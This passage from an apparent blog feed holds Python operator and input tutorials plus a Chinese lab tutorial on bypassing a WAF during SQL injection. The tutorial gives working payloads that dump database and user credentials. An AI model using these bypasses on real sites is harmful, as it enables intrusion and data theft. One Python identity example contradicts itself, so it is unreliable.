in</td><td>某一个对象没有包含于另外一个对象则返回True</td><td>‘hello’ not in ‘hello world!’ 返回False</td></tr></tbody></table><p>注意：虽然下述两种判断可以达到相同的效果，但我们推荐使用第二种格式，因为not in语义更加明确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in 包含返回True</span></span><br><span class="line">print(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;hello world!&#x27;</span>)    <span class="comment"># 输出结果：True</span></span><br><span class="line">print(<span class="string">&#x27;aaaa&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;hello world!&#x27;</span>)     <span class="comment"># 输出结果：False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># not in 没有包含则返回True</span></span><br><span class="line">print(<span class="keyword">not</span> <span class="string">&#x27;lili&#x27;</span> <span class="keyword">in</span> [<span class="string">&#x27;jack&#x27;</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;robin&#x27;</span>])     <span class="comment"># 输出结果：True</span></span><br><span class="line">print(<span class="string">&#x27;lili&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;jack&#x27;</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;robin&#x27;</span>])     <span class="comment"># 输出结果：True</span></span><br></pre></td></tr></table></figure><hr><h1 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h1><p>身份运算符之前提到过，比较的是内存地址的id</p><table><thead><tr><th>运算符</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>is</td><td>is比较的是id，两个对象的id相同则返回True</td><td></td></tr><tr><td>is not</td><td>在两个对象的id不同时is not会返回True</td><td></td></tr></tbody></table><p>强调：==双等号比较的是value是否相等，而is比较的是id是否相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. id相同，内存地址必定相同，意味着type和value必定相同</span></span><br><span class="line"><span class="comment">#2. value相同type肯定相同，但id可能不同,如下</span></span><br><span class="line">x=<span class="string">&#x27;Info Tony:18&#x27;</span></span><br><span class="line">y=<span class="string">&#x27;Info Tony:18&#x27;</span></span><br><span class="line">print(id(x),id(y)) <span class="comment"># x与y的id不同，但是二者的值相同  #输出结果：15489448 15489448</span></span><br><span class="line">print(x == y) <span class="comment"># 等号比较的是value #输出结果：True</span></span><br><span class="line">print(type(x),type(y)) <span class="comment"># 值相同type肯定相同    #输出结果：&lt;class &#x27;str&#x27;&gt; &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line">print(x <span class="keyword">is</span> y) <span class="comment"># is比较的是id，x与y的值相等但id可以不同 #输出结果：True</span></span><br><span class="line">print(x <span class="keyword">is</span> <span class="keyword">not</span> y)   <span class="comment">#输出结果：False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.WAF绕过原理</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/11.WAF%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/11.WAF%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>现如今，应该是市面上所有的网站都会有着WAF的存在</p><p>Web应用防护系统（也称为：网站应用级<a href="https://baike.baidu.com/item/%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/2083032">入侵防御系统</a>。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>是通过执行一系列针对HTTP/HTTPS的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/2890163">安全策略</a>来专门为Web应用提供保护的一款产品。</p><p>安全对抗一直都存在，有防护手段，肯定就有对应的绕过方式</p><a id="more"></a><hr><h1 id="WAF绕过原理"><a href="#WAF绕过原理" class="headerlink" title="WAF绕过原理"></a>WAF绕过原理</h1><p>熟练掌握MySQL函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=随心所欲绕过WAF防护</p><h2 id="白盒绕过原理"><a href="#白盒绕过原理" class="headerlink" title="白盒绕过原理"></a>白盒绕过原理</h2><p>在Sqli-labs部分关卡有一些防护手段，例如Less-25</p><h3 id="查看代码"><a href="#查看代码" class="headerlink" title="查看代码"></a>查看代码</h3><p>Less-25代码块位置进行了一些修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];<span class="comment">//使用GET方法传入</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;ID:&#x27;</span>.$id.<span class="string">&quot;\n&quot;</span>);<span class="comment">//将输入文件写入result.txt</span></span><br><span class="line">fclose($fp); <span class="comment">//关闭文件</span></span><br><span class="line"></span><br><span class="line">$id= blacklist($id); <span class="comment">//将ID传入blacklist函数</span></span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);<span class="comment">//去掉OR(不区分大小写) i的功能就是忽略大小写</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);<span class="comment">//去掉AND(不区分大小写)</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>id传入后，使用了blacklist函数过滤了<code>or</code>和<code>AND</code>，并且不区分大小写</p><h3 id="常用绕过思维"><a href="#常用绕过思维" class="headerlink" title="常用绕过思维"></a>常用绕过思维</h3><ol><li>大小写变形：Or，OR，oR    （此场景不可用）</li><li>等价替换：and -&gt; &amp;&amp; ， or -&gt; ||</li><li>OorR经过preg_replace替换为OR，中间的or被替换为空</li><li>…..等等</li></ol><p>由于白盒场景能够看到代码，所以可以针对绕过</p><h2 id="黑盒绕过原理"><a href="#黑盒绕过原理" class="headerlink" title="黑盒绕过原理"></a>黑盒绕过原理</h2><p>由于没有代码，所以只能不断进行试探，尝试进行突破</p><h3 id="架构层绕过WAF"><a href="#架构层绕过WAF" class="headerlink" title="架构层绕过WAF"></a>架构层绕过WAF</h3><ol><li><p>寻找源站-&gt;争对云WAF</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200824144927839.png" alt="image-20200824144927839"></p></li><li><p>利用同网段-&gt;绕过WAF防护区域</p><p>使用同网段主机对目标主机进行攻击，即可绕开WAF</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200824150142504.png" alt="image-20200824150142504"></p></li><li><p>利用边界漏洞-&gt;绕过WAF防护区域</p><p>与方式2类似，寻找同网段是否有存在漏洞主机，找到后，使用存在漏洞的主机对目标主机进行攻击，即可绕开WAF</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200824150105222.png" alt="image-20200824150105222"></p></li></ol><h3 id="资源限制角度绕过waf"><a href="#资源限制角度绕过waf" class="headerlink" title="资源限制角度绕过waf"></a>资源限制角度绕过waf</h3><p>WAF的首要前提是保证网站服务的正常运行，故一些大的数据包如果分析，会严重拖慢网站的响应速度，这时候构造大的数据包，数据包中有攻击代码，就有可能绕过WAF检测</p><h3 id="协议层面绕过WAF的检测"><a href="#协议层面绕过WAF的检测" class="headerlink" title="协议层面绕过WAF的检测"></a>协议层面绕过WAF的检测</h3><p>1.协议未覆盖绕过waf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;假设某WAF，只检测GET不请求POST，则可以进行转换请求方式</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;对上传文件数据格式不进行防护</span><br><span class="line">Content-Type变换：application&#x2F;x-www-form-urlencoded;→multipart&#x2F;form-data;</span><br></pre></td></tr></table></figure><p>2.参数污染</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">比如</span><br><span class="line">index.php?id&#x3D;1&amp;id&#x3D;2</span><br><span class="line">网站程序获取:id&#x3D;2</span><br><span class="line">waf获取：id&#x3D;1就不会在检测id&#x3D;2后面的语句</span><br><span class="line">因此可以在id&#x3D;2的后面加上测试语句进行测试</span><br></pre></td></tr></table></figure><h3 id="规则层面绕过"><a href="#规则层面绕过" class="headerlink" title="规则层面绕过(***)"></a>规则层面绕过(***)</h3><p>可以理解为寻找语法正确可以注入但waf匹配不到的数据格式</p><ol><li><p>SQL注释符绕过</p><p>在Mysql中，常见的注释方法有<code>#</code>·或者<code>--空格</code>或者<code>/**/</code></p><p>在注释中还有一种特殊的方式，叫做内联注释，在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union&#x2F;**&#x2F;select</span><br><span class="line">union&#x2F;*aaaa%01bbs*&#x2F;select</span><br><span class="line">union&#x2F;*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*&#x2F;select</span><br><span class="line">内联注释：&#x2F;*!xxx*&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>空白符绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL空白符:%09,%0A,%0B,%0D,%20,%0C,%A0,&#x2F;*xxx*&#x2F;</span><br><span class="line">正则的空白符:%09,%0A,%0B,%0D,%20</span><br><span class="line">Example-1: union%250Cselect</span><br><span class="line">Example-2: union%25A0select</span><br></pre></td></tr></table></figure></li><li><p>函数分割符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">concat%2520(</span><br><span class="line">concat&#x2F;**&#x2F;(</span><br><span class="line">concat%250c(</span><br><span class="line">concat%25a0(</span><br></pre></td></tr></table></figure></li><li><p>浮点数词法解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;8E0union select 1,2,3,4,5,6,7,8,9,0</span><br><span class="line">select * from users where id&#x3D;8.0union select 1,2,3,4,5,6,7,8,9,0</span><br><span class="line">select * from users where id&#x3D;\Nunion select 1,2,3,4,5,6,7,8,9,0</span><br></pre></td></tr></table></figure></li><li><p>利用error-based进行SQL注入：error-based SQL注入函数非常容易被忽略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1, concat(0x5c,md5(3)));</span><br><span class="line">updatexml(1, concat(0x5d,md5(3)),1);</span><br><span class="line">GeometryCollection((select*from(select*from(select@@version)f)x))</span><br><span class="line">polygon((select*from(select name_const(version(),1))x))</span><br><span class="line">linestring()</span><br><span class="line">multipoint()</span><br><span class="line">multilinestring()</span><br><span class="line">multipolygon()</span><br></pre></td></tr></table></figure></li><li><p>mysql特殊语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x table_name&#125;from&#123;x information_schema.tables&#125;;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="Fuzz绕过WAF"><a href="#Fuzz绕过WAF" class="headerlink" title="Fuzz绕过WAF"></a>Fuzz绕过WAF</h1><p>在讲fuzz与sql注入结合绕waf之前我们先来讲讲什么是fuzz，fuzz其实就是一种对请求参数的模糊测试，简单来说就是对一个接口的某个参数或多个参数用自定义的内容进行批量提交，根据接口返回内容来判断自定义内容参数对接口的影响。</p><p>每一个点都能找到绕过的方法，以注释为例，开始Fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">基本模式</span><br><span class="line">union&#x2F;*something*&#x2F;select</span><br><span class="line"></span><br><span class="line">注释符绕过</span><br><span class="line">先测试最基本的:union&#x2F;**&#x2F;select</span><br><span class="line">再测试中间引入特殊字:union&#x2F;*aaaa%01bbs*&#x2F;select</span><br><span class="line">*最后测试注释长度:union&#x2F;*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*&#x2F;select</span><br></pre></td></tr></table></figure><h2 id="场景演示"><a href="#场景演示" class="headerlink" title="场景演示"></a>场景演示</h2><p>测试环境:windows10+phpstudy+sqlilabs+安全狗</p><p>测试环境演示测试，提交攻击代码，发现被拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.192.128&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(version()),2 --+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825144008196.png" alt="image-20200825144008196"></p><p>使用burp抓包，因为burp可以反复提交数据，比较方便</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825194651812.png" alt="image-20200825194651812"></p><p>我们可以看到url编码了，空格被替换成了20%</p><p>我们可以使用一下编码替换空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL空白符:%09,%0A,%0B,%0D,%20,%0C,%A0,&#x2F;*xxx*&#x2F;</span><br></pre></td></tr></table></figure><p>我们模拟替换成<code>/*xxx*/</code>，发送至测试器，选择Battering ram模式(把一个payload加载到多个位置)，将空格编码替换为参数</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825194719393.png" alt="image-20200825194719393"></p><p>修改字符集，暴力破解，添加参数</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825194754623.png" alt="image-20200825194754623"></p><p>由于是本地测试，所以线程数可以弄高一点</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825194823181.png" alt="image-20200825194823181"></p><p>开始攻击，通过长度来判断是否绕过</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825194920866.png" alt="image-20200825194920866"></p><p>发现长度944，打开正常返回页面，注入成功</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825195010203.png" alt="image-20200825195010203"></p><p>将空格替换为<code>/**%//*/</code></p><p>构造攻击url放在浏览器中进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.192.128&#x2F;Less-1&#x2F;?id&#x3D;-1%27&#x2F;**%&#x2F;&#x2F;*&#x2F;union&#x2F;**%&#x2F;&#x2F;*&#x2F;select&#x2F;**%&#x2F;&#x2F;*&#x2F;1,(version()),2--+</span><br></pre></td></tr></table></figure><p>注入成功</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825195108072.png" alt="image-20200825195108072"></p><h3 id="取数据库名"><a href="#取数据库名" class="headerlink" title="取数据库名"></a>取数据库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.192.128&#x2F;Less-1&#x2F;?id&#x3D;-1%27&#x2F;**%&#x2F;&#x2F;*&#x2F;union&#x2F;**%&#x2F;&#x2F;*&#x2F;select&#x2F;**%&#x2F;&#x2F;*&#x2F;1,(select&#x2F;**%&#x2F;&#x2F;*&#x2F;schema_name&#x2F;**%&#x2F;&#x2F;*&#x2F;from&#x2F;**%&#x2F;&#x2F;*&#x2F;information_schema.schemata&#x2F;**%&#x2F;&#x2F;*&#x2F;limit&#x2F;**%&#x2F;&#x2F;*&#x2F;0,1),2--+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825195400062.png" alt="image-20200825195400062"></p><h3 id="取数据表名"><a href="#取数据表名" class="headerlink" title="取数据表名"></a>取数据表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-1&#x2F;?id&#x3D;-1%27&#x2F;*0%5e99*&#x2F;union&#x2F;*0%5e99*&#x2F;select&#x2F;*0%5e99*&#x2F;1,(select&#x2F;**%&#x2F;&#x2F;*&#x2F;group_concat(table_name)&#x2F;**%&#x2F;&#x2F;*&#x2F;from&#x2F;**%&#x2F;&#x2F;*&#x2F;information_schema.tables&#x2F;**%&#x2F;&#x2F;*&#x2F;where&#x2F;**%&#x2F;&#x2F;*&#x2F;table_schema&#x3D;database()),2--+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825200229931.png" alt="image-20200825200229931"></p><h3 id="查询表内容"><a href="#查询表内容" class="headerlink" title="查询表内容"></a>查询表内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.192.128&#x2F;Less-1&#x2F;?id&#x3D;-1%27&#x2F;**%&#x2F;&#x2F;*&#x2F;union&#x2F;**%&#x2F;&#x2F;*&#x2F;select&#x2F;**%&#x2F;&#x2F;*&#x2F;1,(select&#x2F;**%&#x2F;&#x2F;*&#x2F;concat_ws(&#39;~&#39;,username,password)&#x2F;**%&#x2F;&#x2F;*&#x2F;from&#x2F;**%&#x2F;&#x2F;*&#x2F;security.users&#x2F;**%&#x2F;&#x2F;*&#x2F;&#x2F;**%&#x2F;&#x2F;*&#x2F;limit&#x2F;**%&#x2F;&#x2F;*&#x2F;0,1),2--+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200825200702194.png" alt="image-20200825200702194"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>9.python的用户交互</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/9.python%E7%9A%84%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/9.python%E7%9A%84%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<p>在程序中，我们经常能够遇到需要用户输入，或者程序输出的情况，这种情况被统称为用户交互</p><a id="more"></a><hr><h1 id="接收用户输入"><a href="#接收用户输入" class="headerlink" title="接收用户输入"></a>接收用户输入</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = input(<span class="string">&quot;请输入您的账号：&quot;</span>)</span><br></pre></td></tr></table></figure><p>在python3中<code>input</code>功能会等待用户的输入，括号里的内容作用是起到提示作用，用户输入任何内容，都存成字符串类型，然后赋值给等号左边的变量名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username = input(<span class="string">&quot;请输入你的账号:&quot;</span>)  <span class="comment">#  程序就会在这里暂停，然后等待用户输入</span></span><br><span class="line">print(username)</span><br><span class="line"><span class="comment"># 输出结果(用户输入kinght)</span></span><br><span class="line"><span class="comment"># 请输入你的账号:kinght</span></span><br><span class="line"><span class="comment"># kinght</span></span><br></pre></td></tr></table></figure><h2 id="类型转换简介"><a href="#类型转换简介" class="headerlink" title="类型转换简介"></a>类型转换简介</h2><p>前面说到，input接收到的内容全都是字符串形式，但是字符串形式有些功能并不好参与</p><p>例如：现在要判断一个人是否成年？输入了他的年龄要与18进行比较，可字符串形式并不能直接进行比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = input(<span class="string">&quot;请输入年龄：&quot;</span>)</span><br><span class="line">age = int(age)  <span class="comment"># 将age转换为int类型(int只能将纯数字的字符串转为整型)</span></span><br><span class="line">print(age &gt;= <span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>了解知识：</p><p>1、在python2中存在一个raw_input功能与python3中的input功能一模一样</p><p>2、在python2中还存在一个input功能，需要用户输入一个明确的数据类型，输入什么类型就存成什么类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2环境</span></span><br><span class="line">age = input(<span class="string">&#x27;python2测试:&#x27;</span>)<span class="comment">#输入</span></span><br><span class="line">print(type(age)) <span class="comment">#输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入123，输出结果为&lt;type &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="comment">#输入&#x27;abc&#x27;，输出结果为&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="comment">#输入3.14，输出结果为&lt;type &#x27;float&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入成什么类型，python2即保存为什么类型</span></span><br></pre></td></tr></table></figure><p>但python2所带来的后果就是用户的输入不可控，鬼知道会输入什么乱七八糟的东西导致程序错误</p><hr><h1 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h1><p>输出我们已经接触过，就是<code>print</code>，所谓格式化输出，即为提前规定好输出的格式</p><h2 id="号格式"><a href="#号格式" class="headerlink" title="%号格式"></a>%号格式</h2><p> %号格式化字符串的方式从Python诞生之初就已经存在，时至今日，python官方也并未弃用%号，但也并不推荐这种格式化方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、格式的字符串（即%s）与被格式化的字符串（即传入的值）必须按照位置一一对应</span></span><br><span class="line"><span class="comment"># ps：当需格式化的字符串过多时，位置极容易搞混</span></span><br><span class="line">print(<span class="string">&quot;my name is %s , my age is %s&quot;</span> %(<span class="string">&#x27;kinght&#x27;</span>,<span class="number">22</span>))</span><br><span class="line"><span class="comment"># 2、可以通过字典方式格式化，打破了位置带来的限制与困扰</span></span><br><span class="line">print(<span class="string">&#x27;我的名字是 %(name)s, 我的年龄是 %(age)s.&#x27;</span> % &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;kinght&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span>&#125;)</span><br><span class="line">kwargs=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;kinght&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span>&#125;</span><br><span class="line">print(<span class="string">&#x27;我的名字是 %(name)s, 我的年龄是 %(age)s.&#x27;</span> % kwargs)</span><br></pre></td></tr></table></figure><h2 id="str-format（推荐使用）"><a href="#str-format（推荐使用）" class="headerlink" title="str.format（推荐使用）"></a>str.format（推荐使用）</h2><p> 该<code>format</code>方法是在Python 2.6中引入的，是字符串类型的内置方法。因为str.format的方式在性能和使用的灵活性上都比%号更胜一筹，所以推荐使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照位置一一对应</span></span><br><span class="line">print(<span class="string">&quot;&#123;&#125; likes &#123;&#125;&quot;</span>.format(<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;AYM&#x27;</span>))</span><br><span 